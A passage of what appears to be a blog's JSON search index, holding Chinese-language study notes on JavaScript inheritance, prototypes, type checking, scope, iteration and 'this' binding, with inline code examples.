Vehicle()//testIframe.html:193 Uncaught Error: Vehicle cannot be directly instantiated 继承内置类型1234567891011class SuperArray extends Array&#123; shuffle()&#123; for(let i=this.length-1;i&gt;=0;i--)&#123; let j=Math.floor(Math.random(0,i+1));//0-i+1向下取整 [this[i],this[j]]=[this[j],this[i]] &#125; &#125; &#125; let a=new SuperArray(1,2,3,4,5); a.shuffle() console.log(a);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"async 和defer","slug":"async-和defer","date":"2022-04-15T00:51:47.000Z","updated":"2022-04-15T01:02:46.471Z","comments":true,"path":"2022/04/15/async-和defer/","link":"","permalink":"https://coloey.github.io/2022/04/15/async-%E5%92%8Cdefer/","excerpt":"","text":"script元素包含async属性和defer属性： async:可选，表示应该立即开始下载脚本，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载，只对外部脚本文件有效，标记过async的脚本并不保证能按照它们出现的次序执行 defer:可选，表示脚本可以延迟到文档完全被解析和渲染后再执行，相当于告诉浏览器立即下载，延迟执行，且按照顺序执行 只对外部脚本有效，在IE7及更早版本中，对行内脚本也可以指定这个属性 如果把script标签放在head标签里，意味着必须把所有JavaScript代码都下载，加息和解释完成后，才能渲染压面页面在浏览器解析到body的其实标签时开始渲染。因此现代Web通常把js引用放在body元素中页面内容后面这样页面就会在处理js代码之前完全渲染页面","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"组合继承和原型继承","slug":"继承方式","date":"2022-04-14T10:11:28.000Z","updated":"2022-05-01T02:29:50.331Z","comments":true,"path":"2022/04/14/继承方式/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/","excerpt":"","text":"组合继承综合了原型链和盗用构造函数，将两者优点结合，使用原型链继承原型上的属性和方法，通过盗用构造函数继承实例属性，这样既可以把方法定义在原型上实现重用，又可以让每个实例都有自己的属性 1234567891011121314151617181920212223242526function SuperType(name)&#123; this.name=name; this.colors=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;]; &#125; SuperType.prototype.sayName=function()&#123; console.log(this.name);//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文 &#125; function SubType(name,age) &#123; SuperType.call(this,name);//SuperType的构造函数绑定SubType的构造函数,自定义实例属性，第二次调用SuperType this.age=age;&#125;//继承原型上的方法，让SubType的原型指向SuperType的实例,第一次调用SuperType，SubType的constructor会委托到SuperType.prototype上的constructor，进而指向SuperTypeSubType.prototype=new SuperType();SubType.prototype.sayAge=function()&#123; console.log(this.age);&#125;let instance1=new SubType(&#x27;Ann&#x27;,29);instance1.colors.push(&quot;balck&quot;);console.log(instance1.colors);instance1.sayName();instance1.sayAge();let instance2=new SubType(&quot;Greg&quot;,27);console.log(instance2.colors);instance2.sayName();instance2.sayAge(); 原型式继承12345678910111213//object.create()function object(o)&#123; function F()&#123;&#125;;//创建一个构造函数 F.prototype=o;//构造函数的原型指向参数对象o return new F();//返回F对象实例&#125;let person=&#123; name:&quot;Ann&quot;, friends:[&quot;Mary&quot;,&quot;Harry&quot;,&quot;Van&quot;]&#125;let anotherPerson=object(person);anotherPerson.friends.push(&quot;Mike&quot;);console.log(person.friends);// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;] object()函数创建一个临时构造函数，将传入对象赋值给这个构造函数原型，然后返回这个临时类型的一个实例。本质上，object()是对传入的对象执行了一次浅复制，anotherperson.proto=person,如果person是构造函数，则anotherperson的[[Prototype]]将没有指向的prototype对象，也就无法通过prototype对象找到constructor进而使用construcor上面的方法和属性 这里的object函数相当与object.create() 12345678let person=&#123; name:&quot;Ann&quot;, friends:[&quot;Mary&quot;,&quot;Harry&quot;,&quot;Van&quot;]&#125;let anotherPerson=object。create(person);anotherPerson.friends.push(&quot;Mike&quot;);console.log(person.friends);// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;] 原型式继承适合不需要单独创建构造函数，但仍然需要在对象间共享信息的场合。 寄生式继承与原型式继承比较接近的一种继承方式是寄生式继承 12345678910111213function createAnother(original)&#123; let clone=Object.create(original);//通过调用函数创建一个新对象 clone.sayHi=function()&#123;//以某种方式增强这个对象 console.log(&quot;hi&quot;); &#125; return clone;//返回这个对象&#125;let person=&#123; name:&quot;Ann&quot;, friends:[&quot;Mary&quot;,&quot;Harry&quot;,&quot;Van&quot;]&#125;let anotherPerson=createAnother(person);anotherPerson.sayHi(); 寄生式继承同样适合主要关注对象，而不在乎类型和构造函数的场景。痛过寄生式继承给对象添加函数会导致函数难以重用，与构造函数模式类似。 寄生式组合继承1234567891011121314151617181920212223242526function inheritPrototype(subType,superType)&#123;//参数分别是子类和父类的构造函数 let prototype=Object.create(superType.prototype);//先复制父类的原型对象 prototype.constructor=subType;//增强对象，让新的原型对象的构造函数指向子类构造函数 subType.prototype=prototype;//赋值对象，让子类原型指向新的原型&#125;function SuperType(name)&#123; this.name=name; this.colors=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125; SuperType.prototype.sayName=function()&#123; console.log(this.name);//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文 &#125; function SubType(name,age) &#123; SuperType.call(this,name);//SuperType的构造函数绑定SubType的构造函数,调用Supertype() this.age=age; &#125;inheritPrototype(SubType,SuperType);SubType.prototype.sayAge=function()&#123; console.log(this.age); &#125; let instance1=new SubType(&#x27;Ann&#x27;,29); instance1.colors.push(&quot;balck&quot;); console.log(instance1.colors); instance1.sayName(); instance1.sayAge(); 另一种写法： 12345678910111213function SuperType(name)&#123; this.name=name; this.colors=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];&#125; SuperType.prototype.sayName=function()&#123; console.log(this.name);//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文 &#125; function SubType(name,age) &#123; SuperType.call(this,name);//SuperType的构造函数绑定SubType的构造函数,调用Supertype() this.age=age; &#125;SubType.prototype=Object.create(SuperType.prototype)SubType.prototype.constructor=Subtype 寄生式组合继承基本模式： 先创建父类原型的一个副本prototype 给prototype设置constructor属性为subType,增强对象，解决由于重写原型导致默认constructor丢失问题 将新创建的对象赋值给子类型的原型 只调用一次SuperType构造函数，效率最高","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"执行上下文和作用域","slug":"执行上下文和作用域","date":"2022-04-14T08:21:59.000Z","updated":"2022-04-14T08:45:20.666Z","comments":true,"path":"2022/04/14/执行上下文和作用域/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/","excerpt":"","text":"执行上下文有全局上下文和函数上下文，块级上下文： 上下文中的代码在执行时，会创建变量对象的一个作用域链，这个作用域链决定了各级上下文中的代码在访问变量和函数时的顺序，代码正在执行的上下文的变量对象始终位于作用域链的最前端，如果上下文时函数，则其活动对象用作变量对象，作用域链中的下一个变量对象来自包含上下文…以此类推至全局上下文，全局上下文变量对象始终是作用域链的最后一个变量对象（window) 作用域链增强执行上下文主要有全局上下文和函数上下文两种（eval()调用内部存在第三种上下文），但有其他方式增强作用域链， try/catch语句中的catch块 with语句 这两种情况会在作用域链的前端添加一个变量对象，对with语句来说，会向作用域链前端添加指定对象，对catch语句，会创建一个新的变量对象，这个变量对象会包含要抛出的错误对象的声明 1234567function buildUrl()&#123; let qs=&quot;?debug=true&quot;; with(location)&#123; let url=href+qs; &#125; return url;&#125; with语句将location对象作为上下文，因此location会被添加到作用域链的前端","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"原始值与引用值及确定类型","slug":"原始值与引用值及确定类型","date":"2022-04-14T07:04:04.000Z","updated":"2022-04-14T08:21:25.400Z","comments":true,"path":"2022/04/14/原始值与引用值及确定类型/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"原始值和引用值ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。 引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。 区别动态属性引用值可以随时添加，修改删除属性。 而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例， 12345678let name1=&quot;Nicholas&quot;;let name2=new String(&quot;Matt&quot;);name1.age=27;name2.age=26;console.log(name1.age);//undefinedconsole.log(name2.age);//26console.log(typeof name1);//stringconsole.log(typeof name2);//object 复制值通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。 12let num1=5;let num2=num1; num1和num2相互独立，num2是num1的副本 当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。 1234let obj1=new Object();let obj2=obj1;obj1.name=&quot;Nic&quot;;console.log(obj2.name);//Nic 传递参数ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。 123456789function addTen(num)&#123;//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count num+=10; return num; &#125;let count=20;let res=addTen(count);console.log(count);//20，没有变化console.log(res);//30 如果是对象： 12345678function setName(obj)&#123; obj.name=&quot;Nic&quot;；//此时多了一个obj指针指向person,将name改为Nic obj=new Object();//又创建一个指针，指向内存其他位置 obj.name=&quot;Greg&quot;;//函数调用结束，obj被销毁&#125;let person=new Object();setName(person);console.log(person.name);//&#x27;Nic&#x27; typeoftypeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。 instanceof如果变量是给定引用类型的实例，则instanceof操作符返回true 1console.log(person instanceof Object);//变量person是Object吗 按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"原始值与引用值及确定类型","slug":"确定类型","date":"2022-04-14T07:04:04.000Z","updated":"2022-05-02T14:42:33.431Z","comments":true,"path":"2022/04/14/确定类型/","link":"","permalink":"https://coloey.github.io/2022/04/14/%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"原始值和引用值ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。 引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。 区别动态属性引用值可以随时添加，修改删除属性。 而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例， 12345678let name1=&quot;Nicholas&quot;;let name2=new String(&quot;Matt&quot;);name1.age=27;name2.age=26;console.log(name1.age);//undefinedconsole.log(name2.age);//26console.log(typeof name1);//stringconsole.log(typeof name2);//object 复制值通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。 12let num1=5;let num2=num1; num1和num2相互独立，num2是num1的副本 当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。 1234let obj1=new Object();let obj2=obj1;obj1.name=&quot;Nic&quot;;console.log(obj2.name);//Nic 传递参数ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。 123456789function addTen(num)&#123;//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count num+=10; return num; &#125;let count=20;let res=addTen(count);console.log(count);//20，没有变化console.log(res);//30 如果是对象： 12345678function setName(obj)&#123; obj.name=&quot;Nic&quot;；//此时多了一个obj指针指向person,将name改为Nic obj=new Object();//又创建一个指针，指向内存其他位置 obj.name=&quot;Greg&quot;;//函数调用结束，obj被销毁&#125;let person=new Object();setName(person);console.log(person.name);//&#x27;Nic&#x27; typeoftypeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。 instanceof如果变量是给定引用类型的实例，则instanceof操作符返回true 1console.log(person instanceof Object);//变量person是Object吗 按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。 对象标识和相等判定ES6之前： 12console.log(+0===-0);//truecosole.log(NAN===NAN);//false ES6中的object.is()与===很像，但同时考虑了上述边界情形，这个方法接收两个参数： 1234console.log(Object.is(true,1));//falseconsole.log(Object.is(&#123;&#125;,&#123;&#125;));//falseconsole.log(Object.is(+0,-0));//falseconsole.log(Object.is(NAN,NAN));//true 检查超过两个值是否相等 1234function recursiveEqual(x,...rest)&#123; return Object.is(x,rest[0])||(rest.length&lt;2||recursiveEqual(...rest)); &#125; constructor:constructor两个作用， 判断数据的类型 对象实例通过prototype对象上的constructor访问它的构造函数，因此如果改变prototype对象，constructor就不能用来判断数据类型 123456console.log((2).constructor === Number); // trueconsole.log((true).constructor === Boolean); // trueconsole.log((&#x27;str&#x27;).constructor === String); // trueconsole.log(([]).constructor === Array); // trueconsole.log((function() &#123;&#125;).constructor === Function); // trueconsole.log((&#123;&#125;).constructor === Object); // true 12345678function Fn()&#123;&#125;; Fn.prototype = new Array(); var f = new Fn(); console.log(f.constructor===Fn); // falseconsole.log(f.constructor===Array); // true Object.prototype.toString.call()Object.prototype.toString.call()使用Object对象的原型方法toString来判断数据类型 12345678910var a = Object.prototype.toString; console.log(a.call(2));console.log(a.call(true));console.log(a.call(&#x27;str&#x27;));console.log(a.call([]));console.log(a.call(function()&#123;&#125;));console.log(a.call(&#123;&#125;));console.log(a.call(undefined));console.log(a.call(null)); 注意：同样是检测对象obj调用toString方法，obj.toString()的结果和Object.prototype.toString.call(obj)的结果不一样，这是因为toString是Object的原型方法，而Array,function等类型作为Object的实例，都重写了toString()方法，不同的对象类型调用toString方法时，根据原型链的知识，调用的是对应的重写之后的toString()方法，（function类型返回内容为函数体的字符串，Array类型返回元素组成的字符串…），而不会去调用Object上原型toString方法（返回对象的具体类型），所以采用obj.toString()不能得到其对象类型，只能将obj转换为字符串类型；因此，在想要得到对象的具体类型时，应该调用Object原型上的toString方法。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"原型模式","slug":"原型模式","date":"2022-04-13T14:03:03.000Z","updated":"2022-05-02T16:03:58.907Z","comments":true,"path":"2022/04/13/原型模式/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"构造函数构造函数也是函数，与普通函数唯一区别就是调用方式不同。任何函数只要使用new操作符调用就是构造函数，而不适用new操作符调用的函数就是普通函数。 理解原型只要创建一个函数，就会按照特定的规则为这个函数创建一个prototype属性（指向原型对象），默认情况下，所有原型对象会自动获得一个名为constructor指向Person 123456789101112131415161718192021222324function Person()&#123;&#125; console.log(typeof Person.prototype); console.log(Person.prototype); //正常原型链都会终止于Object的原型对象 //Object原型的原型是null console.log(Person.prototype.__proto__===Object.prototype);//true console.log(Person.prototype.__proto__.constructor===Object);//true console.log(Person.prototype.__proto__.__proto__===null);//true console.log(Person.prototype.__proto__);//true let person1=new Person(),person2=new Person(); //构造函数，原型对象和实例是3个完全不同的对象 console.log(person1!==Person);//true console.log(person1!==Person.prototype);//true console.log(Person.prototype!==Person);//true //实例通过__proto__链接到原型对象，它实际上指向隐藏特性[[Prototype]] //实例与构造函数没有联系，与原型对象有直接联系 console.log(person1.__proto__===Person.prototype); console.log(person1.__proto__.constructor===Person); //同一个构造函数创建的两个实例共享同一个原型对象 console.log(person1.__proto__===person2.__proto__); //instanceof检查实例的原型链中是否包含指定构造函数的原型 console.log(person1 instanceof Person);//true console.log(person1 instanceof Object);//true console.log(Person.prototype instanceof Object);//true Person构造函数，Person原型对象和Person现有实例的关系如上：Person.prototype指向原型对象，因此Person.prototye.constructor指回Person构造函数。原型对象包含constructor属性和其他后来添加的属性。Person的两个实例person1,person2有一个内部属性指回Person.prototype,而且两者和构造函数没有直接联系。person1.sayName()可以正常调用，这是由于对象属性查找机制的原因 虽然不是所有实现都对外暴露[[Prototype]]，但可以使用isPrototypeOf()方法确定两个对象之间的关系，本质上isPrototypeOf()会在传入参数的[[Prototype]]指向调用它的对象时返回true 12console.log(Person.prototype.isprototypeOf(person1));//trueconsole.log(Person.prototype.isprototypeOf(person2));//true Object类型有一个方法叫Object.getPrototypeOf(),返回参数的内部特性[[Prototype]]的值 12console.log(Object.getPrototypeOf(person1)==Person.prototype);//trueconsole.log(Object.getPrototypeOf(person1).name); 使用Object.getPrototypeOf()可以取得一个对象的原型 Object类型还有一个setPrototypeOf()方法，可以向实例的私有特性[[Prototype]]写入一个新值，这样就可以重写一个对象的原型继承关系 12345678910let biped=&#123; numLegs:2 &#125;; let person=&#123; name:&#x27;Matt&#x27; &#125;; Object.setPrototypeOf(person,biped); console.log(person.name); console.log(person.numLegs); console.log(Object.getPrototypeOf(person)===biped); Object.setPrototypeOf()可能会严重影响代码性能，会涉及所有访问了哪些修改过[[Prototype]]的对象的代码 可以通过Object.create()创建一个新对象，同时为其指定原型 12345678let biped=&#123; numLegs:2&#125;;let person=Object.create(biped);person.name=&#x27;Matt&#x27;;console.log(person.name);console.log(person.numLegs);console.log(Object.getPrototypeOf(person)===biped);//true 原型层级通过对象访问属性时会按照这个属性名称开始搜索，搜索开始于对象实例本身，如果在实例上发现给定的名称，则返回该名称对应值，如果没有找到这个属性，则搜索会沿着指针进入原型对象，在原型对象找到属性后返回对应值。 比如foo不直接存在于myObject中而是存在于原型链上层时，myObject.foo=”bar”会出现三种情况： 如果在[[Prototype]]链上层存在名为foo的普通数据访问属性，并且writable:true,那就会直接在myObject中添加一个名为foo的新属性，它是屏蔽属性 如果在[[Prototype]]链上层存在foo,但是它是被标记为只读(writable:false)，那么无法修改已有属性或者在myObject上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。不会发生屏蔽 如果在[[Prototype]]链上层存在foo并且它是一个setter，那就一定会调用这个setter,foo不会添加到myObject，也不会重新定义foo这个setter。 当属性被屏蔽时，可以使用delete删除实例上的这个属性。 1234567891011function Person()&#123;&#125;Person.prototype.name=&#x27;Nicholas&#x27;;Person.prototype.age=29;let person1=new Person();let person2=new Person();person1.name=&quot;Greg&quot;;console.log(person1.name);//&quot;Greg&quot;,来自实例console.log(person2.name);//Nicholas,来自原型delete person1.name;console.log(person1.name);//Nicholas,来自原型 hasOwnProperty()hasOwnProperty()方法用于确定某个属性是在实例上还是原型对象上。这个方法继承自Object，会在属性存在于调用它的对象实例善时返回true in操作符in操作符会在可以通过对象访问指定属性时返回true，无论该属性是在实例上还是在原型上 因此如果要确定某个属性是否在原型上可以同时使用hasOwnProperty()和in操作符 123function hasPrototypeProperty(object,name)&#123; return !Object.hasOwnProperty(name)&amp;&amp;(name in object)&#125; 原型的问题弱化了向构造函数传递初始化参数的能力，会导致所有实例默认取得属性相同的值，以及它的共享特性： 1234567891011121314151617function Person()&#123; Person.prototype=&#123; constructor:Person, name:&#x27;nic&#x27;, age:29, job:&quot;Software Engineer&quot;, friends:[&#x27;Coloey&#x27;,&#x27;Amy&#x27;], sayName()&#123; console.log(this.name) &#125; &#125; &#125; let person1=new Person(); let person2=new Person(); person1.friends.push(&#x27;Van&#x27;); console.log(person1.friends===person2.friends);//true 不同实例应有不同的副本。 原型链原型链是ECMAScript的主要继承方式 1234567891011121314151617function SuperType()&#123; this.property=true; &#125; SuperType.prototype.getSuperValue=function()&#123; return this.property; &#125; function SubType()&#123; this.subproperty=false; &#125; //继承SuperType SubType.prototype=new SuperType(); SubType.prototype.getSubValue=function()&#123; return this.subproperty; &#125; let instance=new SubType(); console.log(instance.getSuperValue());//true console.log(instance.property)//true SubType.prototype是SuperType的实例，因此SubType.prototype指向SuperType.prototype,注意，getSuperValue()方法还在SuperType.prototype对象上，而property是一个实例属性，SubType.prototype是SuperType的实例，因此property存在它上面，由于SubType.prototype的constructor属性被重写指向SuperType,所以instance.constructor也指向SuperType. 原型与继承关系使用instanceOf操作符，如果一个实例的原型链出现过相应构造函数则instanceOf返回true 12console.log(instance instanceof Object);console.loh(instance instanceof SubType); 使用**isPrototypeOf()**方法，原型链上的每个原型都可以调用这个方法，只要原型链上包含这个原型就返回true 123console.log(Object.prototype.isPrototypeOf(instance));//true console.log(SuperType.prototype.isPrototypeOf(instance));//true console.log(SubType.prototype.isPrototypeOf(instance));//true 以对象字面量的方式创建原型方法会破坏之前的原型链： 1234567891011121314151617181920212223function SuperType()&#123; this.property=true; &#125; SuperType.prototype.getSuperValue=function()&#123; return this.property; &#125; function SubType()&#123; this.subproperty=false; &#125; //继承SuperType SubType.prototype=new SuperType();//通过对象字面量添加新方法，会导致上一行无效 SubType.prototype=&#123; getSubValue()&#123; return this.subproperty; &#125;, someOtherMethod()&#123; return false; &#125; &#125; let instance=new SubType(); console.log(instance.getSuperValue());//出错 原型链的问题就是会在原型中包含的引用值会在实例间共享。 1234567891011function SuperType()&#123; this.color=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;] &#125; function SubType()&#123; &#125; SubType.prototype=new SuperType(); let intance1=new SubType(); intance1.color.push(&quot;black&quot;); console.log(intance1.color); let instance2=new SubType(); console.log(instance2.color); 盗用构造函数12345678910111213function SuperType()&#123; this.color=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;] &#125; function SubType()&#123; //继承SuperType SuperType.call(this); &#125; //SubType.prototype=new SuperType(); let intance1=new SubType(); intance1.color.push(&quot;black&quot;); console.log(intance1.color); let instance2=new SubType(); console.log(instance2.color); 使用call()，SuperType构造函数在为SubType的实例创建的新对象的上下文中执行了，相当于新的SubType对象上运行了SuperType()函数的所有初始化代码 传递参数：123456789101112function SuperType(arr)&#123; this.color=[&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;] arr.forEach(item=&gt;this.color.push(item)); &#125; function SubType()&#123; //继承SuperType SuperType.call(this,[&#x27;black&#x27;]); &#125; let intance1=new SubType(); console.log(intance1.color);//[&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;green&#x27;, &#x27;black&#x27;] let instance2=new SubType(); console.log(instance2.color);//[&#x27;red&#x27;, &#x27;blue&#x27;, &#x27;green&#x27;, &#x27;black&#x27;] 问题：也是使用构造函数模式自定义类型的问题：必须在构造函数中定义方法，因此函数不能重用，此外，子类也不能访问父类原型上定义的方法，因此所有类型只能使用构造函数模式。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"js中的遍历","slug":"遍历","date":"2022-04-13T09:33:34.000Z","updated":"2022-08-14T08:22:44.419Z","comments":true,"path":"2022/04/13/遍历/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E9%81%8D%E5%8E%86/","excerpt":"","text":"for…in 用来遍历对象的可枚举属性列表，包括原型链上的键， 某些情况下会以任意顺序遍历键名 forEach(…)用来遍历数组中的所有普值并忽略回调函数的返回值， break命令或return 命令不能奏效 for…of直接遍历值，会首先向被访问对象请求一个迭代器对象，然后通过调用迭代器对象的next()方法来遍历所有返回值， 和for…in一样简洁的语法，可以与break,continue和return配合使用，提供了遍历所有数据结构的统一操作接口 自定义对象迭代器 1234567891011121314151617181920212223242526272829var myObject=&#123; a:2, b:3 &#125;; Object.defineProperty(myObject,Symbol.iterator,&#123; enumerable:false, writable:false, configurable:true, value:function()&#123; var o=this; var idx=0; var ks=Object.keys(o);//获取Object对象所有键值 return&#123; next:function()&#123;//next是一个函数 return&#123; value:o[ks[idx++]], done:(idx&gt;ks.length) &#125; &#125; &#125; &#125; &#125;) var it=myObject[Symbol.iterator](); it.next(); it.next(); it.next(); for(let v of myObject)&#123; console.log(v); &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Object","slug":"Object","date":"2022-04-13T09:25:11.000Z","updated":"2022-04-13T09:25:12.130Z","comments":true,"path":"2022/04/13/Object/","link":"","permalink":"https://coloey.github.io/2022/04/13/Object/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"理解this","slug":"理解this","date":"2022-04-13T07:56:41.000Z","updated":"2022-05-02T03:20:59.790Z","comments":true,"path":"2022/04/13/理解this/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3this/","excerpt":"","text":"判断this指向： 由new调用？绑定到新创建的对象 由call或者apply（获得bind)调用?)绑定到指定对象 由上下文对象调用，绑定到那个上下文对象 默认：严格模式下绑定undefined否则绑定全局对象 箭头函数例外，会根据当前词法作用域来决定this,会绑定第一个在作用域链上找到的标识符。 this 的指向在 ES5 中，其实 this 的指向，始终坚持一个原理：this 永远指向最后调用它的那个对象，来，跟着我朗读三遍：this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象。记住这句话，this 你已经了解一半了。 下面我们来看一个最简单的例子：例 1： 12345678910var name = &quot;windowsName&quot;;function a() &#123; var name = &quot;Cherry&quot;; console.log(this.name); // windowsName console.log(&quot;inner:&quot; + this); // inner: Window&#125;a();console.log(&quot;outer:&quot; + this) // outer: Window复制代码 这个相信大家都知道为什么 log 的是 windowsName，因为根据刚刚的那句话“this 永远指向最后调用它的那个对象”，我们看最后调用 a 的地方 a();，前面没有调用的对象那么就是全局对象 window，这就相当于是 window.a()；注意，这里我们没有使用严格模式，如果使用严格模式的话，全局对象就是 undefined，那么就会报错 Uncaught TypeError: Cannot read property &#39;name&#39; of undefined。 再看下这个例子：例 2： 12345678var name = &quot;windowsName&quot;;var a = &#123; name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // Cherry &#125;&#125;a.fn();复制代码 在这个例子中，函数 fn 是对象 a 调用的，所以打印的值就是 a 中的 name 的值。是不是有一点清晰了呢~ 我们做一个小小的改动：例 3： 12345678var name = &quot;windowsName&quot;; var a = &#123; name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // Cherry &#125; &#125; window.a.fn();复制代码 这里打印 Cherry 的原因也是因为刚刚那句话“this 永远指向最后调用它的那个对象”，最后调用它的对象仍然是对象 a。 我们再来看一下这个例子：例 4： 12345678var name = &quot;windowsName&quot;;var a = &#123; // name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // undefined &#125;&#125;window.a.fn();复制代码 这里为什么会打印 undefined 呢？这是因为正如刚刚所描述的那样，调用 fn 的是 a 对象，也就是说 fn 的内部的 this 是对象 a，而对象 a 中并没有对 name 进行定义，所以 log 的 this.name 的值是 undefined。 这个例子还是说明了：this 永远指向最后调用它的那个对象，因为最后调用 fn 的对象是 a，所以就算 a 中没有 name 这个属性，也不会继续向上一个对象寻找 this.name，而是直接输出 undefined。 再来看一个比较坑的例子：例 5： 1234567891011var name = &quot;windowsName&quot;;var a = &#123; name : null, // name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // windowsName &#125;&#125;var f = a.fn;f();复制代码 这里你可能会有疑问，为什么不是 Cherry，这是因为虽然将 a 对象的 fn 方法赋值给变量 f 了，但是没有调用，再接着跟我念这一句话：“this 永远指向最后调用它的那个对象”，由于刚刚的 f 并没有调用，所以 fn() 最后仍然是被 window 调用的。所以 this 指向的也就是 window。 由以上五个例子我们可以看出，this 的指向并不是在创建的时候就可以确定的，在 es5 中，永远是this 永远指向最后调用它的那个对象。 再来看一个例子：例 6： 1234567891011var name = &quot;windowsName&quot;;function fn() &#123; var name = &#x27;Cherry&#x27;; innerFunction(); function innerFunction() &#123; console.log(this.name); // windowsName &#125;&#125;fn()复制代码 读到现在了应该能够理解这是为什么了吧(oﾟ▽ﾟ)o。 怎么改变 this 的指向改变 this 的指向我总结有以下几种方法： 使用 ES6 的箭头函数 在函数内部使用 _this = this 使用 apply、call、bind new 实例化一个对象 例 7： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;,100); &#125;&#125;;a.func2() // this.func1 is not a function复制代码 在不使用箭头函数的情况下，是会报错的，因为最后调用 setTimeout 的对象是 window，但是在 window 中并没有 func1 函数。 我们在改变 this 